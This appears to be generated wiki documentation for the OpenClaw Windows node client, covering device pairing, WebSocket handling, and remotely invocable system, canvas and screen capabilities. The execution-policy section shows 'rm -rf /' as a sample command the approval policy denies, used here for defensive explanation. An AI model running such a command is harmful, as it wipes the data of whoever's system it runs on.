The client is wrapped by `NodeService` ([src/OpenClaw.Tray.WinUI/Services/NodeService.cs:15-489]()) which integrates it with the WinUI application lifecycle and capability implementations.

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:16-85](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:15-53]()

---

## Architecture

```mermaid
graph TB
    subgraph "WinUI Application"
        NodeService["NodeService<br/>(NodeService.cs)"]
        SystemCap["SystemCapability"]
        CanvasCap["CanvasCapability"]
        ScreenCap["ScreenCapability"]
        CameraCap["CameraCapability"]
    end
    
    subgraph "OpenClaw.Shared"
        NodeClient["WindowsNodeClient<br/>WebSocket client<br/>Device pairing"]
        DeviceIdentity["DeviceIdentity<br/>Ed25519 keypair<br/>Device token storage"]
        Registration["NodeRegistration<br/>capabilities[]<br/>commands[]<br/>permissions{}"]
    end
    
    subgraph "Gateway"
        Gateway["OpenClaw Gateway<br/>WebSocket server<br/>ws://localhost:18789"]
        DeviceRegistry["Device Registry<br/>Pairing approval"]
    end
    
    subgraph "File System"
        KeyFile["%LOCALAPPDATA%/OpenClawTray/<br/>device-keypair.json"]
        TokenFile["%LOCALAPPDATA%/OpenClawTray/<br/>device-token.txt"]
    end
    
    NodeService -->|"ConnectAsync(url, token)"| NodeClient
    NodeService -->|"RegisterCapability()"| NodeClient
    
    NodeClient -->|"Initialize()"| DeviceIdentity
    NodeClient -->|"Contains"| Registration
    
    DeviceIdentity -->|"Load/Save"| KeyFile
    DeviceIdentity -->|"Load/Save"| TokenFile
    
    SystemCap -->|"Registered"| NodeClient
    CanvasCap -->|"Registered"| NodeClient
    ScreenCap -->|"Registered"| NodeClient
    CameraCap -->|"Registered"| NodeClient
    
    NodeClient <-->|"WebSocket Protocol"| Gateway
    Gateway -->|"Approval workflow"| DeviceRegistry
```

**Core components:**

| Component | File | Purpose |
|-----------|------|---------|
| `WindowsNodeClient` | [src/OpenClaw.Shared/WindowsNodeClient.cs:16]() | WebSocket client, message routing, pairing orchestration |
| `DeviceIdentity` | Referenced at [src/OpenClaw.Shared/WindowsNodeClient.cs:24,74]() | Ed25519 keypair management, signature generation |
| `NodeRegistration` | [src/OpenClaw.Shared/WindowsNodeClient.cs:32,78-84]() | Declares capabilities, commands, permissions |
| `NodeService` | [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:15]() | UI integration, capability registration |

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:16-85](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:15-138]()

---

## Device Identity & Ed25519 Authentication

### Identity Creation

The `DeviceIdentity` class manages a persistent Ed25519 keypair that uniquely identifies the Windows node. On first initialization, it:

1. Generates a new Ed25519 keypair using cryptographic random number generation
2. Derives a device ID from the public key (Base64url-encoded)
3. Stores the keypair in `%LOCALAPPDATA%\OpenClawTray\device-keypair.json`
4. Initializes empty device token storage

**Initialization code:** [src/OpenClaw.Shared/WindowsNodeClient.cs:74-75]()

```
_deviceIdentity = new DeviceIdentity(dataPath, _logger);
_deviceIdentity.Initialize();
```

### Device ID Format

The device ID is the Base64url-encoded public key. Two formats are exposed:

| Property | Example | Usage |
|----------|---------|-------|
| `FullDeviceId` | Full Base64url string (~44 chars) | Used in approval commands, internal identification |
| `ShortDeviceId` | First 16 characters | Displayed to users in UI |

**Source:** [src/OpenClaw.Shared/WindowsNodeClient.cs:56-62]()

### Signature Generation

During connection, the client signs a payload containing:
- Nonce from gateway challenge
- Timestamp (`signedAt`)
- Client ID (`"node-host"`)
- **Authentication token** (operator token or device token)

**Signature logic:** [src/OpenClaw.Shared/WindowsNodeClient.cs:479-503]()

```
var signature = _deviceIdentity.SignPayload(nonce, signedAt, ClientId, authToken);
```

The signature proves possession of the private key without transmitting it.

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:74-75,479-503]()

---

## Connection & Pairing Flow

### Connection Sequence

```mermaid
sequenceDiagram
    participant App as "NodeService"
    participant Client as "WindowsNodeClient"
    participant Identity as "DeviceIdentity"
    participant Gateway as "OpenClaw Gateway"
    participant User as "User (CLI)"
    
    Note over App,Gateway: Initial Connection
    
    App->>Client: ConnectAsync(gatewayUrl, token)
    Client->>Identity: Initialize()
    Identity-->>Client: deviceId, publicKey
    
    Client->>Gateway: WebSocket connect
    Gateway->>Client: event: connect.challenge<br/>{nonce, ts}
    
    Note over Client,Identity: Sign Challenge
    
    Client->>Identity: SignPayload(nonce, ts, clientId, token)
    Identity-->>Client: signature (Ed25519)
    
    Client->>Gateway: req: connect<br/>{device: {id, publicKey, signature}}
    
    alt Device Not Paired
        Gateway-->>Client: res: hello-ok<br/>(no deviceToken)
        Client->>Client: Set _isPendingApproval = true
        Client->>App: PairingStatusChanged(Pending)
        
        Note over User,Gateway: Manual Approval Required
        
        User->>Gateway: openclaw devices list
        Gateway-->>User: [pending device shown]
        User->>Gateway: openclaw devices approve <deviceId>
        Gateway->>Gateway: Store device token
        
        Note over Client,Gateway: Reconnect to Get Token
        
        Client->>Gateway: WebSocket reconnect
        Gateway->>Client: event: connect.challenge
        Client->>Identity: SignPayload (with operator token)
        Client->>Gateway: req: connect
        Gateway-->>Client: res: hello-ok<br/>{auth: {deviceToken}}
        Client->>Identity: StoreDeviceToken(deviceToken)
        Identity-->>Identity: Save to device-token.txt
        Client->>App: PairingStatusChanged(Paired)
    else Device Already Paired
        Client->>Identity: Get deviceToken
        Identity-->>Client: deviceToken (from file)
        Client->>Identity: SignPayload (with deviceToken)
        Client->>Gateway: req: connect<br/>(signed with deviceToken)
        Gateway-->>Client: res: hello-ok
        Client->>App: PairingStatusChanged(Paired)
    end
    
    Note over Client,Gateway: Ready for Commands
    
    Gateway->>Client: event: node.invoke.request
    Client->>App: InvokeReceived event
```

**Key message types:**

| Type | Direction | Purpose |
|------|-----------|---------|
| `event: connect.challenge` | Gateway → Client | Provides nonce for signature |
| `req: connect` | Client → Gateway | Sends device identity + signature |
| `res: hello-ok` | Gateway → Client | Confirms registration, may include `deviceToken` |

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:121-159,443-463,468-548,550-643]()

### Pairing States

```mermaid
stateDiagram-v2
    [*] --> Unpaired: First connection
    Unpaired --> PendingApproval: Connect sent,<br/>no device token
    PendingApproval --> Paired: Gateway approves,<br/>returns deviceToken
    Paired --> Paired: Reconnect with<br/>deviceToken
    
    note right of PendingApproval
        User must run:
        openclaw devices approve <deviceId>
    end note
    
    note right of Paired
        deviceToken stored in:
        device-token.txt
    end note
```

**State properties:**

| State | `IsPaired` | `IsPendingApproval` | Token Status |
|-------|-----------|---------------------|--------------|
| Unpaired | `false` | `false` | No device token file |
| Pending Approval | `false` | `true` | No device token, connected |
| Paired | `true` | `false` | Device token stored and used |

**State tracking code:** [src/OpenClaw.Shared/WindowsNodeClient.cs:36-62,602-621]()

### Device Token Storage

When the gateway approves a device and returns a `deviceToken` in the `hello-ok` response:

1. Token extracted from `payload.auth.deviceToken` ([src/OpenClaw.Shared/WindowsNodeClient.cs:577-596]())
2. Stored via `DeviceIdentity.StoreDeviceToken()` ([src/OpenClaw.Shared/WindowsNodeClient.cs:585]())
3. Written to `%LOCALAPPDATA%\OpenClawTray\device-token.txt`
4. Used for all subsequent connections instead of operator token

**Approval detection:** [src/OpenClaw.Shared/WindowsNodeClient.cs:575-596]()

```csharp
if (authPayload.TryGetProperty("deviceToken", out var deviceTokenProp))
{
    var deviceToken = deviceTokenProp.GetString();
    if (!string.IsNullOrEmpty(deviceToken))
    {
        var wasWaiting = _isPendingApproval;
        _isPendingApproval = false;
        _logger.Info("Received device token - we are now paired!");
        _deviceIdentity.StoreDeviceToken(deviceToken);
        
        if (wasWaiting)
        {
            PairingStatusChanged?.Invoke(this, new PairingStatusEventArgs(...));
        }
    }
}
```

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:575-620]()

---

## Connection Management

### WebSocket Lifecycle

The client maintains a persistent WebSocket connection with automatic recovery:

**Connection states:**

| Property | Type | Purpose |
|----------|------|---------|
| `_webSocket` | `ClientWebSocket?` | Underlying WebSocket instance |
| `_isConnected` | `bool` | True after successful `hello-ok` |
| `_cts` | `CancellationTokenSource` | Cancellation for all async operations |

**Connection establishment:** [src/OpenClaw.Shared/WindowsNodeClient.cs:121-159]()

```csharp
public async Task ConnectAsync()
{
    StatusChanged?.Invoke(this, ConnectionStatus.Connecting);
    
    _webSocket = new ClientWebSocket();
    _webSocket.Options.KeepAliveInterval = TimeSpan.FromSeconds(30);
    
    // Set Origin header for CORS
    var uri = new Uri(_gatewayUrl);
    var origin = $"{(uri.Scheme == "wss" ? "https" : "http")}://{uri.Host}:{uri.Port}";
    _webSocket.Options.SetRequestHeader("Origin", origin);
    
    // Add Basic auth if credentials present
    if (!string.IsNullOrEmpty(_credentials))
    {
        _webSocket.Options.SetRequestHeader("Authorization", $"Basic {encoded}");
    }
    
    await _webSocket.ConnectAsync(uri, _cts.Token);
    
    // Start message loop
    _ = Task.Run(() => ListenForMessagesAsync(), _cts.Token);
}
```

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:121-159,184-241]()

### Reconnection Strategy

On connection failure or closure, the client automatically reconnects with exponential backoff:

**Backoff schedule:** [src/OpenClaw.Shared/WindowsNodeClient.cs:28]()

```csharp
private static readonly int[] BackoffMs = { 1000, 2000, 4000, 8000, 15000, 30000, 60000 };
```

**Reconnection logic:** [src/OpenClaw.Shared/WindowsNodeClient.cs:816-843]()

```csharp
private async Task ReconnectWithBackoffAsync()
{
    var delay = BackoffMs[Math.Min(_reconnectAttempts, BackoffMs.Length - 1)];
    _reconnectAttempts++;
    _logger.Warn($"Node reconnecting in {delay}ms (attempt {_reconnectAttempts})");
    StatusChanged?.Invoke(this, ConnectionStatus.Connecting);
    
    await Task.Delay(delay, _cts.Token);
    
    // Safely dispose old socket
    var oldSocket = _webSocket;
    _webSocket = null;
    try { oldSocket?.Dispose(); } catch { }
    
    await ConnectAsync();
}
```

The backoff caps at 60 seconds and continues indefinitely until cancelled.

**Trigger conditions for reconnection:**
- `WebSocketException` with `ConnectionClosedPrematurely` ([src/OpenClaw.Shared/WindowsNodeClient.cs:214-218]())
- Server sends `Close` message ([src/OpenClaw.Shared/WindowsNodeClient.cs:205-211]())
- Listen loop encounters unexpected exception ([src/OpenClaw.Shared/WindowsNodeClient.cs:222-227]())

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:28,214-241,816-843]()

### Message Processing

Incoming WebSocket messages are parsed and routed by type:

```mermaid
graph LR
    Receive["ListenForMessagesAsync<br/>Buffer: 65KB"]
    Parse["ProcessMessageAsync<br/>JSON parsing"]
    
    Event["HandleEventAsync"]
    Response["HandleResponse"]
    Request["HandleRequestAsync"]
    
    ChallengeEvt["connect.challenge<br/>→ SendNodeConnectAsync"]
    InvokeEvt["node.invoke.request<br/>→ Dispatch to capability"]
    
    HelloRes["hello-ok response<br/>→ Set _isConnected"]
    ErrorRes["Error response<br/>→ StatusChanged(Error)"]
    
    InvokeReq["node.invoke request<br/>→ Dispatch to capability"]
    PingReq["ping request<br/>→ Send pong"]
    
    Receive -->|"type: event"| Event
    Receive -->|"type: res"| Response
    Receive -->|"type: req"| Request
    
    Event --> ChallengeEvt
    Event --> InvokeEvt
    
    Response --> HelloRes
    Response --> ErrorRes
    
    Request --> InvokeReq
    Request --> PingReq
```

**Message loop:** [src/OpenClaw.Shared/WindowsNodeClient.cs:184-241]()

**Message dispatch:** [src/OpenClaw.Shared/WindowsNodeClient.cs:243-285]()

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:184-285,287-307,550-643,645-672]()

---

## Capability Registration

The node client acts as a registry and dispatcher for capabilities. During initialization, `NodeService` registers all capability handlers:

**Registration flow:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:103-138]()

```csharp
private void RegisterCapabilities()
{
    // System capability (notifications + command execution)
    _systemCapability = new SystemCapability(_logger);
    _systemCapability.NotifyRequested += OnSystemNotify;
    _systemCapability.SetCommandRunner(new LocalCommandRunner(_logger));
    _systemCapability.SetApprovalPolicy(new ExecApprovalPolicy(_dataPath, _logger));
    _nodeClient.RegisterCapability(_systemCapability);
    
    // Canvas capability (WebView2 control)
    _canvasCapability = new CanvasCapability(_logger);
    _canvasCapability.PresentRequested += OnCanvasPresent;
    // ... more event handlers
    _nodeClient.RegisterCapability(_canvasCapability);
    
    // Screen + Camera capabilities
    _nodeClient.RegisterCapability(_screenCapability);
    _nodeClient.RegisterCapability(_cameraCapability);
}
```

### Registration Data Structure

Each capability updates the `NodeRegistration` object sent during connection:

**Registration update:** [src/OpenClaw.Shared/WindowsNodeClient.cs:90-108]()

```csharp
public void RegisterCapability(INodeCapability capability)
{
    _capabilities.Add(capability);
    
    // Update registration
    if (!_registration.Capabilities.Contains(capability.Category))
    {
        _registration.Capabilities.Add(capability.Category);
    }
    foreach (var cmd in capability.Commands)
    {
        if (!_registration.Commands.Contains(cmd))
        {
            _registration.Commands.Add(cmd);
        }
    }
}
```

**Registration payload:** [src/OpenClaw.Shared/WindowsNodeClient.cs:527-529]()

```csharp
caps = _registration.Capabilities,        // ["system", "canvas", "screen", "camera"]
commands = _registration.Commands,        // ["system.notify", "canvas.present", ...]
permissions = _registration.Permissions   // {"camera.capture": true, "screen.record": true}
```

### Command Dispatch

When the gateway sends a `node.invoke` command, the client routes it to the appropriate capability:

**Dispatch logic:** [src/OpenClaw.Shared/WindowsNodeClient.cs:389-415]()

```csharp
// Find capability that can handle this command
var capability = _capabilities.FirstOrDefault(c => c.CanHandle(command));

if (capability == null)
{
    await SendNodeInvokeResultAsync(requestId, false, null, 
        $"Command not supported: {command}");
    return;
}

// Raise event for UI notification
InvokeReceived?.Invoke(this, request);

// Execute the command
var response = await capability.ExecuteAsync(request);
response.Id = requestId;

await SendNodeInvokeResultAsync(requestId, response.Ok, response.Payload, response.Error);
```

**Command validation:** [src/OpenClaw.Shared/WindowsNodeClient.cs:346-353,696-703]()
- Must be alphanumeric with dots, underscores, hyphens only
- Maximum 100 characters
- Regex: `^[a-zA-Z0-9._-]+$`

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:90-108,346-415,527-529,696-703](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:103-138]()

---

## Events & Status Notifications

The `WindowsNodeClient` exposes three primary events:

### StatusChanged Event

Fired when connection state changes:

```csharp
public event EventHandler<ConnectionStatus>? StatusChanged;
```

**Status values:**
- `Connecting` - WebSocket connection in progress
- `Connected` - Received `hello-ok` from gateway
- `Disconnected` - Connection closed
- `Error` - Connection or authentication failed

**Emission points:**
- [src/OpenClaw.Shared/WindowsNodeClient.cs:125]() - On `ConnectAsync()` start
- [src/OpenClaw.Shared/WindowsNodeClient.cs:621]() - On successful registration
- [src/OpenClaw.Shared/WindowsNodeClient.cs:209,218,226]() - On connection failures
- [src/OpenClaw.Shared/WindowsNodeClient.cs:641]() - On registration error

### PairingStatusChanged Event

Fired when device pairing state changes:

```csharp
public event EventHandler<PairingStatusEventArgs>? PairingStatusChanged;
```

**PairingStatus values:**
- `Pending` - Device registered, awaiting approval
- `Paired` - Device approved, token received

**Emission points:**
- [src/OpenClaw.Shared/WindowsNodeClient.cs:607-610]() - On pending approval
- [src/OpenClaw.Shared/WindowsNodeClient.cs:589-594]() - On approval received
- [src/OpenClaw.Shared/WindowsNodeClient.cs:616-618]() - On reconnect with stored token

**Event args include:**
- `Status` - Current pairing status
- `DeviceId` - Full device ID
- `Message` - Optional message (e.g., approval command)

### InvokeReceived Event

Fired when gateway sends a command:

```csharp
public event EventHandler<NodeInvokeRequest>? InvokeReceived;
```

**Purpose:** Notify UI that command execution is starting (for logging, notifications)

**Emission:** [src/OpenClaw.Shared/WindowsNodeClient.cs:402,731]()

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:41-43,125,209,218,226,402,589-594,607-621,641,731]()

---

## Integration Example

Typical usage in `NodeService`:

```csharp
// Initialization
var nodeClient = new WindowsNodeClient(gatewayUrl, token, dataPath, logger);
nodeClient.StatusChanged += OnNodeStatusChanged;
nodeClient.PairingStatusChanged += OnPairingStatusChanged;

// Register capabilities
nodeClient.RegisterCapability(systemCapability);
nodeClient.RegisterCapability(canvasCapability);
nodeClient.RegisterCapability(screenCapability);
nodeClient.RegisterCapability(cameraCapability);

// Set permissions
nodeClient.SetPermission("camera.capture", true);
nodeClient.SetPermission("screen.record", true);

// Connect
await nodeClient.ConnectAsync();

// Check state
if (nodeClient.IsPendingApproval)
{
    ShowToast($"Pending approval: {nodeClient.ShortDeviceId}");
    ShowToast($"Run: openclaw devices approve {nodeClient.FullDeviceId}");
}
```

**Full integration:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:58-81]()

**Sources:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:58-81]()

---

# Page: Capability System

# Capability System

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/Capabilities/SystemCapability.cs](src/OpenClaw.Shared/Capabilities/SystemCapability.cs)
- [src/OpenClaw.Shared/WindowsNodeClient.cs](src/OpenClaw.Shared/WindowsNodeClient.cs)
- [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs](src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs)
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs](src/OpenClaw.Tray.WinUI/Services/NodeService.cs)
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs)
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs](tests/OpenClaw.Shared.Tests/CapabilityTests.cs)
- [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs](tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs)

</details>



The capability system provides a modular architecture for implementing remotely-invocable commands in Node Mode. Each capability represents a category of functionality (system, canvas, screen, camera) and exposes specific commands that the OpenClaw Gateway can invoke over WebSocket. Capabilities are registered with the `WindowsNodeClient` and handle command execution independently.

For information about Node Mode connection and pairing, see [Node Client & Pairing](#4.1). For details on individual capability implementations, see [System Capability](#4.3), [Canvas Capability](#4.4), and [Screen & Camera Capabilities](#4.5).

---

## Architecture Overview

The capability system uses a plugin-style architecture where each capability implements the `INodeCapability` interface and registers itself with the node client. When commands arrive from the gateway, the node client routes them to the appropriate capability based on the command name.

```mermaid
graph TB
    subgraph "WindowsNodeClient"
        Client[WindowsNodeClient]
        Registry["_capabilities List&lt;INodeCapability&gt;"]
        Registration[NodeRegistration]
    end
    
    subgraph "Capability Implementations"
        SystemCap[SystemCapability]
        CanvasCap[CanvasCapability]
        ScreenCap[ScreenCapability]
        CameraCap[CameraCapability]
    end
    
    subgraph "Base Infrastructure"
        Interface[INodeCapability]
        Base[NodeCapabilityBase]
    end
    
    subgraph "Data Structures"
        InvokeReq[NodeInvokeRequest]
        InvokeResp[NodeInvokeResponse]
    end
    
    SystemCap --> Base
    CanvasCap --> Base
    ScreenCap --> Base
    CameraCap --> Base
    
    Base --> Interface
    
    Client --> Registry
    Client --> Registration
    
    Registry --> SystemCap
    Registry --> CanvasCap
    Registry --> ScreenCap
    Registry --> CameraCap
    
    Client --> InvokeReq
    SystemCap --> InvokeResp
    
    Registration -.->|"Categories<br/>Commands<br/>Permissions"| Interface
```

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:30-108](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:103-138]()

---

## Capability Interface and Base Class

All capabilities implement `INodeCapability`, which defines the contract for capability identification and command execution. The `NodeCapabilityBase` abstract class provides common functionality for argument parsing and response construction.

### Core Interface

```mermaid
classDiagram
    class INodeCapability {
        <<interface>>
        +string Category
        +IReadOnlyList~string~ Commands
        +bool CanHandle(string command)
        +Task~NodeInvokeResponse~ ExecuteAsync(NodeInvokeRequest request)
    }
    
    class NodeCapabilityBase {
        <<abstract>>
        +string Category*
        +IReadOnlyList~string~ Commands*
        #IOpenClawLogger Logger
        +bool CanHandle(string command)
        +Task~NodeInvokeResponse~ ExecuteAsync(NodeInvokeRequest request)*
        #NodeInvokeResponse Success(object payload)
        #NodeInvokeResponse Error(string message)
        #string GetStringArg(JsonElement args, string key, string defaultValue)
        #int GetIntArg(JsonElement args, string key, int defaultValue)
        #bool GetBoolArg(JsonElement args, string key, bool defaultValue)
    }
    
    class NodeInvokeRequest {
        +string Id
        +string Command
        +JsonElement Args
    }
    
    class NodeInvokeResponse {
        +string Id
        +bool Ok
        +object Payload
        +string Error
    }
    
    INodeCapability <|-- NodeCapabilityBase
    NodeCapabilityBase ..> NodeInvokeRequest
    NodeCapabilityBase ..> NodeInvokeResponse
```

**Key Methods:**

| Method | Purpose |
|--------|---------|
| `CanHandle(command)` | Checks if this capability handles the given command |
| `ExecuteAsync(request)` | Executes the command and returns a response |
| `Success(payload)` | Creates a successful response with payload |
| `Error(message)` | Creates an error response |
| `GetStringArg()` / `GetIntArg()` / `GetBoolArg()` | Parse typed arguments from `JsonElement` |

**Sources:** [src/OpenClaw.Shared/Capabilities/INodeCapability.cs](), [src/OpenClaw.Shared/Capabilities/NodeCapabilityBase.cs]()

---

## Capability Registration Flow

Capabilities are registered during node initialization. Each capability declares its category, supported commands, and optionally hooks up to UI or system services for execution.

```mermaid
sequenceDiagram
    participant NS as NodeService
    participant Client as WindowsNodeClient
    participant Cap as Capability
    participant Reg as NodeRegistration
    
    NS->>+Client: new WindowsNodeClient(url, token)
    NS->>NS: Create SystemCapability
    NS->>NS: Create CanvasCapability
    NS->>NS: Create ScreenCapability
    NS->>NS: Create CameraCapability
    
    NS->>+Cap: new SystemCapability(logger)
    Cap->>Cap: Initialize commands array
    NS->>Cap: SetCommandRunner(runner)
    NS->>Cap: SetApprovalPolicy(policy)
    
    NS->>+Client: RegisterCapability(systemCap)
    Client->>Cap: .Category
    Cap-->>Client: "system"
    Client->>Cap: .Commands
    Cap-->>Client: ["system.notify", "system.run", ...]
    
    Client->>Reg: Add "system" to Capabilities
    Client->>Reg: Add commands to Commands list
    Client->>Client: _capabilities.Add(systemCap)
    Client-->>-NS: 
    
    Note over NS,Reg: Repeat for Canvas, Screen, Camera
    
    NS->>Client: SetPermission("camera.capture", true)
    Client->>Reg: Permissions["camera.capture"] = true
    
    NS->>Client: ConnectAsync()
    Client->>Client: Send NodeRegistration to gateway
```

**Registration Data Structure:**

| Field | Type | Purpose |
|-------|------|---------|
| `Id` | `string` | Device ID (from Ed25519 keypair) |
| `Version` | `string` | Node version (e.g., "1.0.0") |
| `Platform` | `string` | Always "windows" |
| `DisplayName` | `string` | Human-readable name |
| `Capabilities` | `List<string>` | Category names: ["system", "canvas", "screen", "camera"] |
| `Commands` | `List<string>` | All supported command names |
| `Permissions` | `Dictionary<string, bool>` | Permission flags |

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:77-108](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:103-138]()

---

## Command Invocation Flow

When the gateway sends a `node.invoke.request` event, the `WindowsNodeClient` routes it to the appropriate capability based on command name matching.

```mermaid
sequenceDiagram
    participant GW as Gateway
    participant Client as WindowsNodeClient
    participant Cap as INodeCapability
    participant Impl as Capability Implementation
    
    GW->>Client: event: node.invoke.request
    Note over GW,Client: {requestId, command, args}
    
    Client->>Client: Validate command format
    Note over Client: Regex: ^[a-zA-Z0-9._-]+$
    
    Client->>Client: Find capability
    loop _capabilities
        Client->>Cap: CanHandle(command)
        Cap-->>Client: true/false
    end
    
    alt No capability found
        Client->>GW: node.invoke.result (error)
    else Capability found
        Client->>Cap: ExecuteAsync(request)
        Cap->>Impl: Handle specific command
        Impl->>Impl: Execute logic
        Impl-->>Cap: Result payload
        Cap-->>Client: NodeInvokeResponse
        Client->>GW: node.invoke.result
        Note over Client,GW: {id, nodeId, ok, payload}
    end
```

**Validation and Routing Logic:**

1. **Command Validation** ([src/OpenClaw.Shared/WindowsNodeClient.cs:346-353]()):
   - Reject empty commands or commands > 100 characters
   - Allow only `[a-zA-Z0-9._-]` characters
   - Prevents injection attacks

2. **Capability Matching** ([src/OpenClaw.Shared/WindowsNodeClient.cs:390-397]()):
   - Iterate through `_capabilities` list
   - Call `CanHandle(command)` on each
   - First match wins (order matters)

3. **Error Handling**:
   - Missing capability → `"Command not supported"`
   - Execution exception → `"Execution failed: {message}"`
   - Validation failure → `"Invalid command format"`

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:309-415](), [src/OpenClaw.Shared/WindowsNodeClient.cs:674-744]()

---

## Capability Implementations

### System Capability

Handles system-level operations: notifications, command execution, and execution policy management.

**Commands:**

| Command | Purpose | Arguments |
|---------|---------|-----------|
| `system.notify` | Show Windows toast notification | `title`, `body`, `subtitle`, `sound` |
| `system.run` | Execute local commands | `command`, `args`, `shell`, `cwd`, `timeoutMs`, `env` |
| `system.which` | Resolve executable paths | `bins` (array of names) |
| `system.execApprovals.get` | Get execution policy | None |
| `system.execApprovals.set` | Update execution policy | `rules`, `defaultAction` |

**Key Components:**

```mermaid
graph LR
    SysCap[SystemCapability]
    Runner[ICommandRunner]
    Policy[ExecApprovalPolicy]
    Local[LocalCommandRunner]
    Event[NotifyRequested Event]
    
    SysCap --> Runner
    SysCap --> Policy
    Local -.->|implements| Runner
    SysCap --> Event
    
    Runner -->|system.run| Process[Process Execution]
    Policy -->|checks| Approval[Allow/Deny/Prompt]
```

**Execution Policy Security:**

The `ExecApprovalPolicy` provides dual-layer security for `system.run`:

1. **Pattern Matching** ([src/OpenClaw.Shared/Capabilities/ExecApprovalPolicy.cs]()): Rules with glob patterns (`echo *`, `Get-*`, etc.)
2. **Shell Filtering**: Rules can be shell-specific (`pwsh`, `cmd`, `bash`)
3. **Default Action**: Fallback when no rules match (deny by default)

Example policy evaluation flow:

```mermaid
graph TD
    Start[Command: rm -rf /] --> Check1{Rule 1: echo *}
    Check1 -->|No match| Check2{Rule 2: Get-*}
    Check2 -->|No match| Check3{Rule 3: *}
    Check3 -->|No match| Default[Default Action: Deny]
    Default --> Denied[Command Denied]
```

**Sources:** [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:1-383](), [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs:1-394]()

---

### Canvas Capability

Controls a WebView2 window for displaying web content, executing JavaScript, and capturing screenshots.

**Commands:**

| Command | Purpose | Arguments |
|---------|---------|-----------|
| `canvas.present` | Show/configure canvas window | `url`, `html`, `width`, `height`, `x`, `y`, `title`, `alwaysOnTop` |
| `canvas.hide` | Hide canvas window | None |
| `canvas.navigate` | Navigate to URL | `url` |
| `canvas.eval` | Execute JavaScript | `javaScript` (or `script`) |
| `canvas.snapshot` | Capture screenshot | `format`, `maxWidth`, `quality` |
| `canvas.a2ui.push` | Push A2UI messages | `jsonl` or `jsonlPath` |
| `canvas.a2ui.reset` | Reset A2UI state | None |

**Security Features:**

```mermaid
graph TB
    subgraph "URL Validation"
        URL[Input URL]
        Check1{Dangerous<br/>scheme?}
        Check2{Private<br/>network?}
        Check3{Data URL?}
        Valid[Allow]
        Block[Block/Throw]
        
        URL --> Check1
        Check1 -->|file://, javascript:, etc.| Block
        Check1 -->|http://, https://| Check2
        Check2 -->|localhost, 127.*, 10.*, etc.| Block
        Check2 -->|Public| Valid
        
        URL --> Check3
        Check3 -->|data:text/html| Valid
        Check3 -->|data:other| Block
    end
    
    subgraph "HTML Sanitization"
        HTML[Input HTML]
        Strip[Strip iframe/object/embed]
        SafeHTML[Safe HTML]
        
        HTML --> Strip
        Strip --> SafeHTML
    end
```

**Validation Logic:**

- **Blocked Schemes** ([src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:24-28]()): `file:`, `javascript:`, `data:` (except safe types), `vbscript:`
- **Blocked Networks**: IPv4 private ranges, IPv6 localhost, localhost domains
- **HTML Sanitization** ([src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:246-257]()): Removes `<iframe>`, `<object>`, `<embed>`, `<applet>`

**A2UI Integration:**

The canvas can host the OpenClaw A2UI (Adaptive UI) protocol for rich agent-driven interfaces:

1. Navigate to `{gateway}/__openclaw__/a2ui/`
2. Send JSONL messages via `canvas.a2ui.push`
3. Messages are injected via `window.__a2ui.receive()`, `window.a2ui.push()`, or `postMessage()`

**Sources:** [src/OpenClaw.Shared/Capabilities/CanvasCapability.cs](), [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:1-446](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:329-636]()

---

### Screen Capability

Captures screenshots of monitors with configurable format and resolution.

**Commands:**

| Command | Purpose | Arguments |
|---------|---------|-----------|
| `screen.capture` | Capture screenshot | `format`, `maxWidth`, `quality`, `screenIndex` (or `monitor`) |
| `screen.list` | List available monitors | None |

**Capture Flow:**

```mermaid
sequenceDiagram
    participant Cap as ScreenCapability
    participant Service as ScreenCaptureService
    participant WinAPI as Windows Graphics API
    participant Toast as Toast Notification
    
    Cap->>Service: CaptureAsync(args)
    Service->>WinAPI: Capture monitor pixels
    WinAPI-->>Service: Raw bitmap
    Service->>Service: Resize if maxWidth < actual
    Service->>Service: Encode as PNG/JPEG
    Service-->>Cap: ScreenCaptureResult
    Note over Service,Toast: Throttled notification<br/>(10s cooldown)
    Service->>Toast: "📸 Screen Captured"
    
    Cap->>Cap: Build response
    Note over Cap: {image: "data:image/png;base64,..."}
```

**Result Structure:**

```typescript
{
  image: string,      // Data URI: "data:image/png;base64,..."
  width: number,      // Actual captured width
  height: number,     // Actual captured height
  format: "png" | "jpeg"
}
```

